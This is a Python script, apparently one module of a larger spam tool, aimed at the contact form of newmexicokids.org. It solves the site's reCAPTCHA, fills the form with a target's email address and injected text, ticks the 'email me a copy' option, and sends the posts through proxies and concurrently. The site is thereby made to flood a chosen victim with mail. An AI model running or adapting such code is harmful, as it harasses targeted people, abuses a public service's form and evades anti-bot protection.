from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.1930260189.1676993997',
    '_ga': 'GA1.2.150516675.1676366462',
    '_gat_gtag_UA_210684909_2': '1',
    '_ga_CW5VL9PEY8': 'GS1.1.1677056123.3.1.1677056148.0.0.0',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryfmysq9NFADwvWn9v',
    # 'Cookie': '_gid=GA1.2.1930260189.1676993997; _ga=GA1.2.150516675.1676366462; _gat_gtag_UA_210684909_2=1; _ga_CW5VL9PEY8=GS1.1.1677056123.3.1.1677056148.0.0.0',
    'Origin': 'https://www.newmexicokids.org',
    'Referer': 'https://www.newmexicokids.org/contact-us/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
pageurl = 'https://www.newmexicokids.org/contact-us/'
googlekey = '6Let6ngfAAAAAMxgzwFoHL65E6S71IWxyo0qtnwN'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(pageurl, googlekey)
        if not cap:
            return

        data = '------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest https://www.newmexicokids.org/contact-us/\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest https://www.newmexicokids.org/contact-us/\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_2_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_14"\r\n\r\nBernalillo\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_3"\r\n\r\n(123) 213-1232\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_6"\r\n\r\ntest https://www.newmexicokids.org/contact-us/\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_7"\r\n\r\nOther Early Childhood Referral\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_8"\r\n\r\ntest https://www.newmexicokids.org/contact-us/\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_13.1"\r\n\r\n1\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_13.2"\r\n\r\nEmail me a copy of this message\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_13.3"\r\n\r\n6\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="input_15"\r\n\r\n\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="is_submit_10"\r\n\r\n1\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n10\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="state_10"\r\n\r\nWyJ7XCIxMy4xXCI6XCJkNmQ2MGFkZWQxYWNhMWI5ZmY1MTFjOTk3OTY0ZGY5NFwiLFwiMTMuMlwiOlwiYmUxNGUwMGY0MWU1MDc2MzRhMjJiMTFkOGY1MjU1MWVcIixcIjEzLjNcIjpcImRjYzk1OTNiZWJkNDllNjlkMTIyYTYyOTQxNmY0YTc4XCJ9IiwiZDIxYjNjZmQ0NGZiOGQ4ODc3NjZhNTkzZTM2M2Y1M2YiXQ==\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="gform_target_page_number_10"\r\n\r\n0\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="gform_source_page_number_10"\r\n\r\n1\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryfmysq9NFADwvWn9v--\r\n'
        data = data.replace('cap_que', cap)
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())

        response = requests.post('https://www.newmexicokids.org/contact-us/', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank you')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
